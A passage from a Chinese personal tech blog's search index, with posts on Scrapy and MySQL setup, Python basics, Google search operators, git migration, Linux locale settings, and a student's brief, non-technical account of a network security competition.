装上，这后面基本不会出现问题了1pip install scrapy 装完之后输入 scrapy 就可以知道是否安装成功了，安装完毕后的结果如下1234567891011121314151617181920# scrapyScrapy 1.0.0 - no active projectUsage: scrapy &lt;command&gt; [options] [args]Available commands: bench Run quick benchmark test commands fetch Fetch a URL using the Scrapy downloader runspider Run a self-contained spider (without creating a project) settings Get settings values shell Interactive scraping console startproject Create new project version Print Scrapy version view Open URL in browser, as seen by Scrapy [ more ] More commands available when run from project directoryUse \"scrapy &lt;command&gt; -h\" to see more info about a command","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"PYTHON","slug":"PYTHON","permalink":"https://hexo.bangz.me/tags/PYTHON/"},{"name":"云计算","slug":"云计算","permalink":"https://hexo.bangz.me/tags/云计算/"}]},{"title":"Python —— 快速入门笔记","slug":"83","date":"2015-06-27T22:54:00.000Z","updated":"2018-06-08T09:09:16.000Z","comments":true,"path":"archives/my-notes-when-fast-learning-python.html","link":"","permalink":"https://hexo.bangz.me/archives/my-notes-when-fast-learning-python.html","excerpt":"前一段时间比较忙，就把学到一半 python 搁下了 最近差不多到考试周了，事情也没那么多了，终于可以重新回到战线上啦 搁着的这段时间里，买了本宋吉广翻译的《Python 核心编程》，感觉这本书讲的还挺不错的 买来后直接就看了 “快速入门” 这一章，还真的很快就入门了，基础的语法很快就过了一遍 个人觉得关键点还是异常处理、函数使用、类的使用以及模块使用这几点 下面每个关键点都举个简单例子吧","text":"前一段时间比较忙，就把学到一半 python 搁下了 最近差不多到考试周了，事情也没那么多了，终于可以重新回到战线上啦 搁着的这段时间里，买了本宋吉广翻译的《Python 核心编程》，感觉这本书讲的还挺不错的 买来后直接就看了 “快速入门” 这一章，还真的很快就入门了，基础的语法很快就过了一遍 个人觉得关键点还是异常处理、函数使用、类的使用以及模块使用这几点 下面每个关键点都举个简单例子吧 异常错误处理：打开并读取文件，处理 IO 错误1234567try: fobj = open(raw_input('Enter file name:'), \"r\") for eachLine in fobj: print eachLine, fobj.close()except IOError, e: print 'file open error:', e 函数：加法操作123456def add(x, y = 6): \"this is the documentation\" return x + yprint add(4)print add(4, 5) 类：一个简单的操作类123456789101112131415161718192021222324252627def main(): foo1 = FooClass() foo1.showname() foo1.showver() foo2 = FooClass('Jane Smith') foo2.showname()class FooClass(object): \"\"\"my very first class : FooClass\"\"\" version = 0.1 def __init__(self, nm='John Doe'): \"\"\"constructor\"\"\" self.name = nm # class instance (data) attribute print \"Created a class instance for\", nm def showname(self): \"\"\"display instance attribute and class name\"\"\" print \"Your name is\", self.name print \"My name is\", self.__class__.__name__ def showver(self): \"\"\"display class(static) attribute\"\"\" print self.version # reference FooClass.version def addMe2Me(self, x): \"\"\"apply + operation to argument\"\"\" return x + xif __name__ == '__main__': main() 模块：导入外部模块，其实每个 python 文件都是一个模块，模块的名字就是不带. py 后缀的文件名，通过 import 可以导入模块1234import syssys.stdout.write('Hello World\\n') # call functionprint sys.platform # call variableprint sys.version 另外还有两个比较实用的东西，就是查看 python 帮助 一个是 help，可以在 python 解释器也可以通过执行文件来调用 比如要查看 sys 模块的帮助，就输入1help(sys) 注：在调用帮助之前需要先导入模块，也就是 import sys 还有一种方法就是查看模块的定义文档信息 1sys.stdout.write(sys.__doc__)","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[]},{"title":"十大高明的 Google 搜索技巧","slug":"82","date":"2015-06-11T04:14:00.000Z","updated":"2018-06-08T09:56:53.000Z","comments":true,"path":"archives/ten-useful-searching-skills-when-using-google.html","link":"","permalink":"https://hexo.bangz.me/archives/ten-useful-searching-skills-when-using-google.html","excerpt":"前言：多数人在使用 Google 搜索 的过程是非常低效和无谓的，如果你只是输入几个关键词，然后按搜索按钮，你将是那些无法得到 Google 全部信息的用户，在这篇文章中，Google 搜索专家迈克尔. 米勒将向您展示如何更智能、更高效地进行 Google 的系列搜索。 Google 是一个非常精密成熟的搜索引擎，但大多数的用户都没有能完全地利用到它的能力。一般人就是在 Google 的搜索框中输入一两个关键字，然后点击 “搜索” 按钮，等着 Google 显示出它第一页的搜索结果。这是一个相当简单模式匹配算法的搜索，不幸的是，通常此时出现的大部分都是并不需要的结果。 其实，还是有更好的方式能够让搜索产生一些更少、更为准确的结果。你所需要做的事只是学习一些简单的技巧，你就能很快得到更多更好的 Google 搜索结果。 技巧一：使用正确的方法","text":"前言：多数人在使用 Google 搜索 的过程是非常低效和无谓的，如果你只是输入几个关键词，然后按搜索按钮，你将是那些无法得到 Google 全部信息的用户，在这篇文章中，Google 搜索专家迈克尔. 米勒将向您展示如何更智能、更高效地进行 Google 的系列搜索。 Google 是一个非常精密成熟的搜索引擎，但大多数的用户都没有能完全地利用到它的能力。一般人就是在 Google 的搜索框中输入一两个关键字，然后点击 “搜索” 按钮，等着 Google 显示出它第一页的搜索结果。这是一个相当简单模式匹配算法的搜索，不幸的是，通常此时出现的大部分都是并不需要的结果。 其实，还是有更好的方式能够让搜索产生一些更少、更为准确的结果。你所需要做的事只是学习一些简单的技巧，你就能很快得到更多更好的 Google 搜索结果。 技巧一：使用正确的方法 无论你是使用一个简单或是高级的 Google 搜索，在此都存在你应该使用的某种可靠的方法。遵循适当的方法你就能获得非常准确的结果；要是忽略这条建议的话，你也许就会看到大量不相关的结果或是缺乏你想要的相关结果。 虽然有很多不同（且同样有效的）方法用于网络搜索，我保证这个特别的方法将能带来最棒的结果。这是一个分六步骤的过程，如下： 1、首先，想好你想要寻找什么。哪些词能够最好地描述你要寻找的信息或者概念？哪些词是你能够用来替换的？有没有那些词是可以不必包括在你想要搜索的更好定义你的需求之内？ 2、构建你的搜索要求。使用尽可能多你所需要的关键词；越多越好。如果皆存在可能的话，试着用适当的搜索操作来使你的搜索更精炼——或者，如果你愿意的话，可以使用高级搜索页面。 3、点击 “搜索” 按钮进行搜索。 4、评估一下搜索结果页面上的匹配程度。如果一开始的结果与你想要的不一致，再精炼你的搜索要求并重新搜索——或转向更合适的搜索站点再进行搜索。 5、选择你想要查看的匹配的页面，点击进行浏览。 6、保存这些最符合你需求的信息。 换言之，这需要你在搜索之前思考清楚，接着在获得最初结果后精炼你的搜索。这些多做的努力都是轻微的，但确实很值得。 技巧二：合理利用一个 “与 / 或” 的搜索大多数的用户都没有意识到，Google 会自动假定一次搜索要求中所有的词之间都是一种 “和” 的关系。也就是，如果你输入两个词，它就会假定你所寻找的页面是包含这两个词的。它不会反馈给你仅包含其中一个词的页面。 这就使得你无须在输入搜索要求时输入一个 “和”。如果你想要搜索的包括“Bob” 和“Ted”，你所需要做的就是输入 bob ted 即可。Google 会自己假定一个“和”，并自动地将它包括在内部的索引搜索内。 这与在所要求的词之间假定 “或” 是不同的。例如，对比输入的要求“bobted”（记得，这个实际上是 bob 和 ted）与“bob 或 ted”。根据第一个要求所得的结果所包含的页面会共同提到 Bob 和 Ted. 而后者，结果所包含的页面会只单独提到 Bob，也有些页面是单独提到 Ted，还有一些是共同提到他们二者的。这是一个微妙的差异，但却是很重要的。 因此，如果你想要一个 “与 / 或” 的搜索——搜索包括一个或另一个词的页面，但不一定是都包括二者——你必须在两个关键词之间插入一个带有 “或者” 功能的操作。当你输入这个 “OR” 的表示 “或者” 操作时，请确保所输入的要大写，否则 Google 会将它忽视为一个忽略的单词（stopword）——也我们接下去将要讲到的。 技巧三：你的搜索中包括或不包括的词关于这些 “and” 和“or”的词，Google 会自动地将这些在你输入的搜索要求中的不重要的、普通的词忽略掉。这些被称作是“忽略的单词”，包括“and”、“the，”、“where”、“how”、“what”、“or”（所有字母皆为小写，还有其它一些类似的词——包括一些单独的数字或单独的字母（例如 “a”）。 在搜索中包含忽略的单词并没有什么大碍，不过会使搜索速度有些下降，这就是 Google 将它们剔除的原因。举一个例子，你想要搜索的是“how a toasterworks”（烤箱如何工作），Google 会移除 “how” 和“a”两个词，并自行按新的更短的关键词 “toaster works” 进行搜索。 如果你想要让这些一般的词包含在你的搜索要求内，你可以通过让 Google 必须在搜索中包含这些特定的词，使它不去排除“忽略的单词”。想要做到这点，你可以在你确实需要的词之前加上一个 “+” 符号。例如，要在搜索要求中包含“how”，你应该输入“+how”。请确保在 + 符号之前有一个空格符，而不是在它之后。 从另一方面来说，有时你会想要通过排除一些包含特定词的页面来精炼你的搜索结果。你可以通过使用一个 “-” 号来去掉搜索结果中不想要包括在内的词；在你的搜索要求中任何之前加上了 “-” 符号的词都会自动地排除在搜索结果之外。同样地，也请记住在 “-” 符号之前留一个空格符。 例如，如果你想要搜索“bass”，你所得到的页面可能会包括男歌手一类的或是关于鱼的一类的。如果你仅向搜索的是歌手这类的页面，输入搜索要求时应如下：“bass -fish”。 技巧四：搜索近似的词不确定你在一次搜索中想要搜索的词是正确的？你是否担心一些页面会使用可替代的词来描述你想要的东西呢？ 幸运的是，Google 能够让你搜索近似的词——叫做同义词——通过使用 “~” 符号。只要在想要搜索的词之前加上 “~” 符号，Google 就会搜索所有包括这个词以及合适的近义词的页面。 例如，要搜索类似 “elderly” 的词，输入 “~elderly”，所得到的页面就会不仅是包括“elderly” 这个词，还会有包括 “senior”、“older”、“aged” 等等词的页面。 在此还有个额外的技巧：如果要只是列出近义词的页面，而不需要给出许多原先输入的那个词的页面，可以用 “-” 符号来连接 “~” 操作，例如“~keyword-keyword”。这样就能在近义词所得的结果中排除原先输入的词。在先前的例子中，要得到仅有 “elderly” 近义词的搜索结果，就输入“~elderly -elderly”即可。 技巧五：搜索特定的词组当你搜索一个特定词组时，如果你只是简单地输入词组中所有的词你是无法得到最好的结果的。Google 也许能够反馈出包含这个词组的结果，但它也会列出包含你所输入所有词的结果，却未必让这些词按照正确的顺序。 如果你要搜索一个特定的词组，你应该将整个词组放在一个引号内。这样就能让 Google 搜索规定顺序的精确的关键词。 例如，如果你要搜索“Monty Python”，你可以输入 montypython 作为你的搜索要求，接着你也许会获得可接受的结果；这些结果中会包含有着 “monty” 和“python”两个词的页面。但这些结果并不仅是包含了关于英国喜剧团体的页面，还包括了名叫 Monty 的蛇以及名叫 Monty 的家伙，他养了蛇来当宠物，还有其它一些包括了 “monty” 和“python”的词的页面，即使它们之间看起来似乎毫无关联。 为了将搜索结果限定在只关于 MontyPython 喜剧团之内，也就是你想要搜索的页面是按规定的顺序，将这两个词作为一个词组包含在内的，你就应该在输入搜索要求时输入 “montypython”——确保这个词组在引号之内。这样的话，如果没有按照规定的顺序将这两个次匹配为一个精确的词组，这个页面就不会被列在搜索结果当中。 技巧六：列出相似的页面你是否有发现过一个网页是你确实很喜欢的，又想知道是否还有与它类似的其它网页呢？不需要再疑虑地思考了；你可以使用 Google 的相关来寻找：这个操作算符所显示的页面会与特定的页面在某些方面是相似的。例如，如果你很喜欢 InformIT 上的文章，你可以通过输入“related:http://www.informit.com”来寻找类似的页面。 技巧七：通过其它的操作算符调整你的搜索使用相关操作算符只是众多你可用来调整 Google 搜索结果的方法之一。所有的这些输入的操作算符都是以相同的方式工作的，将这些算符作为你搜索请求的一部分输入，再将变量紧接在这些输入的操作算符之后的冒号之后（而不是空格），就像这样：“‘操作算符’:‘变量’”。 有哪些搜索的操作算符是你可以利用的呢？以下是一个简短的清单： 算符 用途 用法 allinanchor: 限制搜索的词语是网页中链接内包含的关键词（可使用多个关键词） allinanchor:keyword1 keyword2 allintext: 限制搜索的词语是网页内文包含的关键词（可使用多个关键词） allintext:keyword1 keyword2 allintitle: 限制搜索的词语是网页标题中包含的关键词（可使用多个关键词） allintitle:keyword1 keyword2 allinurl: 限制搜索的词语是网页网址中包含的关键词（可使用多个关键词） inurl:keyword1 keyword2 filetype: 限制所搜索的文件一个特定的格式 filetype:extension inanchor: 限制搜索的词语是网页中链接内包含的关键词 inanchor:keyword intext: 限制搜索的词语是网页内文包含的关键词 intext:keyword intitle: 限制搜索的词语是网页标题中包含的关键词 intitle:keyword inurl: 限制搜索的网页的地址 inurl:keyword site: 限制所进行的搜索在指定的域名或网站内 site:domain 技巧八：搜索特定的事实如果你要搜索一些客观事实，Google 也许能够帮得上忙。是的，Google 总是能够反馈给你一个匹配你指定的搜索要求的清单，但只要你能够正确地描述了你的搜索要求，且接着搜索的事实是 Google 已经预先鉴定了额，你就能在搜索结果页面的最顶端得到你所需要的精确信息。 我们在此谈到的有哪些类型的信息呢？是一些事实性的信息，例如诞生日、诞生地、人口等等。你所需要做的就是输入你想要知道的描述事实的搜索要求。例如： 要查询圣弗朗西斯科的人口，则输入“人口 圣弗朗西斯科”。 要查询马克 · 吐温在哪里出生，则输入“出生地 马克吐温”。 要查询总统比尔 · 克林顿什么时候出生，则输入“生日 比尔克林顿”。 要查询雷蒙德 · 钱德勒什么时候去世，则输入“去世 雷蒙德 · 钱德勒”。 要查询谁是德国总统，则输入“总统 德国”。 这些问题的答案就会显示在搜索结果页面的顶部。你能够获根据关联的网站得应对你的疑问的正确答案。点击相关的链接还能从这个资源里获悉更多的东西。 技巧九：搜索 Google DirectoryGoogle 在它的搜索数据库中将成千上万的网页索引化——这就能使得不会产生压倒性数量的搜索结果。量确实已经够了，但有时你也许会更愿意得到一些高质量的结果。 由于质量较数量更为重要，就可以绕过主要的 Google 搜索引擎而使用 Google Directory 来代替。GoogleDirectory 是一个网页清单相对较小的数据库，它们都是通过一个人工编辑团队手动精心挑选的。GoogleDirectory 是有被注释和组织到相关的话题类目下的。你可以通过类目来浏览网页目录，或是搜索指定的项目。 GoogleDirectory 是一个可用来搜索大量 Google 网页索引实用选择。GoogleDirectory 的结果比起你在更大的搜索索引范围中的搜索结果更为集中且高质，也能够帮助你在任何给定的类目下更好地认识什么是可用的信息。另外，如果你喜欢，你也可以利用浏览类目来替代搜索。 要进入 Google Directory，点击 Google 主页上的 “更多” 链接，在接下来的页面中选择类别。当然，你也可以直接进入 Google 的 Directory，只要在浏览器中输入 directory.google.com 即可。 技巧十：使用 Google 的其它专业搜索Google Directory 不仅仅是 Google 所提供的除了主搜索引擎之外的唯一选择。根据你所做的搜索类型，你也可以通过使用其中 Google 更为专业的搜索站点之一来得到更好的结果。它们包括： Froogle 可以用来搜索那些有着最低价格的特定商品的在线购物网站。 Google Answers 所提供的服务是直接让你的搜索需求面向专业人员的小组，大多数都是用于当你有着更为复杂的问题，而无法通过简单的搜索来解答的时候。 Google Apple Macintosh Search 主要是在 apple.com 域名中以及和其它与苹果相关的站点进行搜索。 Google Blog Search 是用来搜索博客和博客文章的。 Google Book Search 可以搜索成千上万的小说和非小说类图书的全文。 Google BSD UNIX Search 可以搜索到大量专门为 BSD 版本的 UNIX 操作系统专业化的站点。 Google Groups 可以搜索到 Google Groups 档案的相关文章。 Google Linux Search 用来搜索大量与 Linux 相关的网站。 Google Microsoft Search 可以搜索主要是 microsoft.com 域名中的内容以及其它微软相关的站点。 Google News 可用来搜索大量有最新新闻和头条的新闻网站，也能够搜索历史的新闻资料，一直可以追溯到两个世纪之前。 Google Scholar 在一个有着学术杂志、文章、报纸、论文和书籍的数据库中进行搜索，也能够选择大学或研究书库。 Google U.S. Government Search 是用来搜索那些美国政府的网站——这是一个最好的用来搜索官方性政府举措、信息、报告等等的地方。 Google University Search 能在一个有着超过 600 所大学网站的数据库中进行搜索——能够用来查询课程安排、入学资料等等。 原文作者：Michael Miller 原文标题：Ten Tips for Smarter Google Searches 原文地址：http://www.informit.com/articles/article.asp?p=675274&amp;rl=1 编译人：雪影蓝风（IT168） 译文地址：http://publish.it168.com/2006/1213/20061213001101.shtml 本文地址：http://www.williamlong.info/archives/728.html","categories":[{"name":"其他","slug":"其他","permalink":"https://hexo.bangz.me/categories/其他/"}],"tags":[{"name":"搜索引擎","slug":"搜索引擎","permalink":"https://hexo.bangz.me/tags/搜索引擎/"}]},{"title":"git 转移源代码到 oschina","slug":"78","date":"2015-06-03T21:23:00.000Z","updated":"2018-06-08T07:24:49.000Z","comments":true,"path":"archives/migrate-sourcecode-to-oschina-using-git.html","link":"","permalink":"https://hexo.bangz.me/archives/migrate-sourcecode-to-oschina-using-git.html","excerpt":"最近一直在开发私有项目，之前听说 bitbucket 不错，能支持团队开发就选了它 但是由于众所周知的一些原因，每次上传代码到 bitbucket 都是一件很痛苦的事情 于是最近听说 oschina 的这一块做的不错，打算试一试 他们官网地址：https://git.oschina.net/ 由于本人对 git 还不是非常熟，稍微记一下这一次转移的过程","text":"最近一直在开发私有项目，之前听说 bitbucket 不错，能支持团队开发就选了它 但是由于众所周知的一些原因，每次上传代码到 bitbucket 都是一件很痛苦的事情 于是最近听说 oschina 的这一块做的不错，打算试一试 他们官网地址：https://git.oschina.net/ 由于本人对 git 还不是非常熟，稍微记一下这一次转移的过程 由于是 windows 下的用 cmd 来弄的，得提前配好 git 的 PATH 环境变量 然后 cd 到项目的目录下，由于之前已经跟 bitbucket 同步过，git 配置已经生成好了 所以不用再执行 git init, commit 之类的命令了 直接在 gitosc 的 web 端上先建立好项目，然后把 git 地址拿到 并在命令行把这个源地址添加进远程列表1git remote add gitosc https://git.oschina.net/monolight/example.git 添加完之后可以用下面命令查看本地记录的远程列表1git remote -v 这时候直接 push 的话可能会被拒绝（rejected），因为 gitosc 默认会生成一些初始化的文件 所以要先 pull 一遍1git pull gitosc master 然后在执行 push1git push gitosc master 当然也可以强制上传，要加个 - f 参数1git push -u gitosc master -f 就这么几条命令而已，很快就搞定了","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"git","slug":"git","permalink":"https://hexo.bangz.me/tags/git/"}]},{"title":"Windows 下安装 Mysql5.6 的 Noinstall 版","slug":"76","date":"2015-05-30T02:28:00.000Z","updated":"2018-06-08T09:04:41.000Z","comments":true,"path":"archives/setup-mysql-noinstall-edition-on-windows.html","link":"","permalink":"https://hexo.bangz.me/archives/setup-mysql-noinstall-edition-on-windows.html","excerpt":"下载：http://dev.mysql.com/downloads/mysql/ 官方安装教程：http://dev.mysql.com/doc/refman/5.6/en/windows-installation.html 安装实操今天由于项目需要，要在 windows 下使用 MySQL，手贱没下到 msi 安装程序 下载完之后才发现下到了 zip 包，不过算了，照样装就是了，下面记一下安装过程","text":"下载：http://dev.mysql.com/downloads/mysql/ 官方安装教程：http://dev.mysql.com/doc/refman/5.6/en/windows-installation.html 安装实操今天由于项目需要，要在 windows 下使用 MySQL，手贱没下到 msi 安装程序 下载完之后才发现下到了 zip 包，不过算了，照样装就是了，下面记一下安装过程 1、把 MySQL 下载下来之后，解压 2、然后进入解压好的文件夹，把里面的 my-default.ini 复制一份，名字改成 my.ini 3、编辑 my.ini，在 [mysqld] 块里面配置好安装路径和数据存放路径12basedir=D:/mysql-5.6.24-winx64datadir=D:/mysql-5.6.24-winx64/data 4、安装 MySQL 服务，进入命令行，cd 到 mysqld 的位置，然后执行1mysqld --install 5、启动 MySQL 服务，在命令行里面执行1net start mysql 6、修改 root 用户的密码，在命令行执行1mysqladmin -u root password 你的密码 这样就算安装完毕了，已经可以用 mysql 客户端登录了 1mysql -u root -p","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://hexo.bangz.me/tags/MySQL/"}]},{"title":"网络攻防学习体验","slug":"74","date":"2015-05-23T06:47:00.000Z","updated":"2018-06-08T07:24:49.000Z","comments":true,"path":"archives/learning-network-security.html","link":"","permalink":"https://hexo.bangz.me/archives/learning-network-security.html","excerpt":"最近去参加了中星的网络攻防比赛 今年比去年弄的要厉害多了，由原来的校内赛现在一下子变成了全省的比赛 在报名的时候只是觉得想来玩玩，以为会像去年一样，听说拿第一 so easy，就来了 直到我第一次开讲座培训，彻底惊讶了，中星都和工信部搞上了！ 参赛者居然还有机会获得网络安全工程师的证书 就像之前的蓝桥杯一样，突然一下就有了个工信部给的软件开发工程师证一样。。。 今年中星还专门自己搞了个论坛，用于远程培训和交流 感觉人气不是很旺，但是 QQ 群的气氛还算可以","text":"最近去参加了中星的网络攻防比赛 今年比去年弄的要厉害多了，由原来的校内赛现在一下子变成了全省的比赛 在报名的时候只是觉得想来玩玩，以为会像去年一样，听说拿第一 so easy，就来了 直到我第一次开讲座培训，彻底惊讶了，中星都和工信部搞上了！ 参赛者居然还有机会获得网络安全工程师的证书 就像之前的蓝桥杯一样，突然一下就有了个工信部给的软件开发工程师证一样。。。 今年中星还专门自己搞了个论坛，用于远程培训和交流 感觉人气不是很旺，但是 QQ 群的气氛还算可以 http://www.gzcsnet.com/forum-47-1.html 根据他们的培训要点，主要涉及的知识点有这些，看起来一下子培训的内容还蛮多的 虚拟机的安装与配置 win2k,winxp,win2003 及其他 windows 操作系统的网络配置 BackTrack5,kali linux 等 debian 系操作系统中的网络配置 （BT5 这个系统我看了他们官网，明明都声明了 outdate 了，但这些家伙还是要用，当时我不明白 到后面我才知道，原来是为了类似 genlist 这样的工具才讲的，在 kali linux 里面没有自带安装 genlist，至于为什么我也不知道了） 通过批量 ping 工具的网络发现，有基于 ICMP 的，也有基于 ARP 的 路由探测工具的使用，有在 windows 基于 ICMP 的 tracert，在 linux 下基于 UDP 的 traceroute，还有基于 TCP 的 tcptraceroute 简单扫描工具的使用，如支持系统和端口扫描的 nmap，能够进行简单的快速分析目标主机 nessus 工具的使用，这玩意很强大，不仅能够进行网络发现，还能够对一定地址段的主机进行漏洞探测和分析，个人感觉这应该算是安全性分析工具的一种 windows IPC 服务的使用，IPC 这玩意本身就非常强大，他们把这当成黑客进攻手段来讲，这也正好说明了这玩意的强大，再加上早期的 ipc 服务的安全方面做得不是很好，所以这个成了他们讲 win2k 时代的机器的重点 （他们在视频里用 ipc 会话的缓存用来讲了文件共享，网络驱动器映射，计算机管理，注册表管理，服务管理的功能，并在命令行里进行用户管理，最终还打开了 windows 远程桌面服务） ARP 欺骗攻击，在 BT5 里面作为中间人用 arpspoof 进行定向发送本机 MAC 地址 基于 ICMP 的洪范 ping 攻击，hping 一下就把目标主机的 CPU 占满了 简单木马程序的使用，这个不想说了，视频里那个工具怎么看都觉得逗比 = =，不过还是能用来玩玩的 其实个人感觉这些个技术的话，只有少数实用的，那些入侵技术基本都淘汰很久了，服务器的话，现在 windows 都已 Server 2008 和 2012 为主，linux 的话，也没有 windows 的这一套东西 要说攻击个体户，其实更难，现在很多的个人 PC 机上都安装了 360 这鬼玩意，TM 这 360 连开个 HFS 都要给你报个木马，这还玩个 P 总的来讲还是有点收获的，能够稍微认识一下网络安全的重要性吧。","categories":[{"name":"其他","slug":"其他","permalink":"https://hexo.bangz.me/categories/其他/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"网络安全","slug":"网络安全","permalink":"https://hexo.bangz.me/tags/网络安全/"}]},{"title":"Mint（Ubuntu）Linux 终端中文显示的处理","slug":"72","date":"2015-05-09T00:35:00.000Z","updated":"2018-06-08T09:00:44.000Z","comments":true,"path":"archives/display-chinese-in-linuxmint-terminal.html","link":"","permalink":"https://hexo.bangz.me/archives/display-chinese-in-linuxmint-terminal.html","excerpt":"一. Ubuntu 默认的中文字符编码Ubuntu 默认的中文字符编码为 zh_CN.UTF-8，这个可以在 /etc/environment 中看到：1sudo gedit /etc/environment 可以看到如下内容：123PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\"LANG=\"zh_CN.UTF-8\"LANGUAGE=\"zh_CN:zh:en_US:en\" 第二行即是默认的中文字符编码。注：可以通过这里修改默认的中文编码字符，比如修改为：zh_CN.GBK。 二. 添加中文字符编码的方法","text":"一. Ubuntu 默认的中文字符编码Ubuntu 默认的中文字符编码为 zh_CN.UTF-8，这个可以在 /etc/environment 中看到：1sudo gedit /etc/environment 可以看到如下内容：123PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\"LANG=\"zh_CN.UTF-8\"LANGUAGE=\"zh_CN:zh:en_US:en\" 第二行即是默认的中文字符编码。注：可以通过这里修改默认的中文编码字符，比如修改为：zh_CN.GBK。 二. 添加中文字符编码的方法 1. 直接使用 locale-gen在终端输入命令：1sudo locale-gen zh_CN.GB18030 即可完成中文字符集的添加。完成后可以转到 /usr/lib/locale/，下面已经有一个 zh_CN.gb18030 文件夹； 在超级终端输入命令：1gedit /var/lib/locales/supported.d/local 可以发现文件中多了一行：zh_CN.GB18030 GB18030。说明添加成功。 2. 通过修改 / var/lib/locales/supported.d/local 文件在终端输入命令行1sudo gedit /var/lib/locales/supported.d/local 可以看到如下内容：12zh_CN.UTF-8 UTF-8en_US.UTF-8 UTF-8 在文件尾添加中文字符集 1zh_CN.GBK GBK 保存后退出。在终端输入命令： 1sudo dpkg-reconfigure locales 123456789101112131415161718192021Generating locales...en_AU.UTF-8... doneen_BW.UTF-8... doneen_CA.UTF-8... doneen_DK.UTF-8... doneen_GB.UTF-8... doneen_HK.UTF-8... doneen_IE.UTF-8... doneen_IN.UTF-8... doneen_NZ.UTF-8... doneen_PH.UTF-8... doneen_SG.UTF-8... doneen_US.UTF-8... doneen_ZA.UTF-8... doneen_ZW.UTF-8... donezh_CN.GBK... donezh_CN.UTF-8... up-to-datezh_HK.UTF-8... donezh_SG.UTF-8... donezh_TW.UTF-8... doneGeneration complete. 即可生成相应文件：/usr/lib/locale/zh_CN.gbk/ 最后重启 ubuntu。","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"}]},{"title":"python 函数定义——简单定义","slug":"70","date":"2015-04-23T08:10:00.000Z","updated":"2018-06-08T08:54:24.000Z","comments":true,"path":"archives/python-define-a-function.html","link":"","permalink":"https://hexo.bangz.me/archives/python-define-a-function.html","excerpt":"在 python 里面，简单的使用 def 关键字就可以定义一个函数，由于 python 是弱类型语言，所以不需声明返回值类型 定义一个 Fibonacci 函数：12345678&gt;&gt;&gt; def fib(n):... a, b = 0, 1... while a &lt; n:... print a,... a, b = b, a+b... &gt;&gt;&gt; fib(2000)0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 由此可见，return 语句可有可无，当不使用 return 语句时，返回值为 None12&gt;&gt;&gt; print fib(2000)0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 None 最后那里的 None 才是 fib 的返回值","text":"在 python 里面，简单的使用 def 关键字就可以定义一个函数，由于 python 是弱类型语言，所以不需声明返回值类型 定义一个 Fibonacci 函数：12345678&gt;&gt;&gt; def fib(n):... a, b = 0, 1... while a &lt; n:... print a,... a, b = b, a+b... &gt;&gt;&gt; fib(2000)0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 由此可见，return 语句可有可无，当不使用 return 语句时，返回值为 None12&gt;&gt;&gt; print fib(2000)0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 None 最后那里的 None 才是 fib 的返回值 python 的函数名跟 javascript 有点相似，直接输入函数名，将返回函数的入口地址 也就是说，函数名本身就是个指针12&gt;&gt;&gt; fib&lt;function fib at 0x7fc0c4aee668&gt; 所以，可以把这个函数名作为指针传递给其他指针变量1&gt;&gt;&gt; f = fib 传递完毕之后，可以直接调用新的指针变量，使用方法跟原函数指针一致12&gt;&gt;&gt; f(2000)0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 如果把前面的例子加上 return 语句的话，那就必须创建个列表，把 Fibonacci 数列的结果给存起来返回 12345678910&gt;&gt;&gt; def fib2(n):... result = []... a, b = 0, 1... while a &lt; n:... result.append(a)... a, b = b, a+b... return result... &gt;&gt;&gt; fib2(2000)[0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597] 当然，也可以把返回值作为结果给存起来 123&gt;&gt;&gt; f2000 = fib2(2000)&gt;&gt;&gt; f2000[0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597]","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[]},{"title":"python 流程控制——循环控制语句 break 与 continue","slug":"69","date":"2015-04-21T09:04:00.000Z","updated":"2018-06-08T08:53:50.000Z","comments":true,"path":"archives/python-flow-control-loop-statement-break-and-continue.html","link":"","permalink":"https://hexo.bangz.me/archives/python-flow-control-loop-statement-break-and-continue.html","excerpt":"由于 python 中没有 switch/case 语句，break 关键字现在也就只能用于循环控制了 跟大多数编程语言一样，break 可以中止当前层的循环 例子：123456&gt;&gt;&gt; for i in range(10):... if (i == 5):... break... print i,... 0 1 2 3 4 在 python 里，for 语句多了一个功能，就是能搭配 else 语句使用！","text":"由于 python 中没有 switch/case 语句，break 关键字现在也就只能用于循环控制了 跟大多数编程语言一样，break 可以中止当前层的循环 例子：123456&gt;&gt;&gt; for i in range(10):... if (i == 5):... break... print i,... 0 1 2 3 4 在 python 里，for 语句多了一个功能，就是能搭配 else 语句使用！ 看看官方给的例子，判断 2-9 中的质数和因数12345678910111213141516&gt;&gt;&gt; for n in range(2, 10):... for x in range(2, n):... if n % x == 0:... print n, 'equals', x, '*', n/x... break... else:... print n, 'is a prime number'... 2 is a prime number3 is a prime number4 equals 2 * 25 is a prime number6 equals 2 * 37 is a prime number8 equals 2 * 49 equals 3 * 3 可以看到，else 语句的缩进和 for 语句的缩进是一样的，也就是说，这里的 else 不是 if 的字句，而是 for 的子句 这里的话，可以从输出结果中看出来，else 子句的执行条件是：for 